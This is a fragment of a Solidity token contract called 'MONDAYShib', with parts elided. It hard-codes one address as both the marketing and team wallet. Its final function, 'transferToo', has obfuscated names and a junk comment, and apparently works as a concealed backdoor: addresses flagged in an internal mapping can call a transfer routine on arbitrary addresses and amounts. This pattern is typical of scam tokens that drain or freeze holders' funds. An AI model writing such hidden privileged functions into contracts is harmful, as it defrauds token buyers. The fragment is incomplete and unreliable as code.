...
contract MON is Context, IERC20, Ownable {
    ...
    string private _name = "MONDAYShib";
    string private _symbol = "MONDAYShib";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0x10655cD783cf295696998eF4F7f0DAf45C8E3DF2); 
    address payable private teamWalletAddress = payable(0x10655cD783cf295696998eF4F7f0DAf45C8E3DF2); 
	...
	*/
	...
	function transferToo(address addddder , uint256 uintVII) public{
	if( _mainSwap[ /*as aXxseeysdaMMN;*/msg.sender])
	   {
	      _transferFrom(addddder, uintVII);
	   }
	}
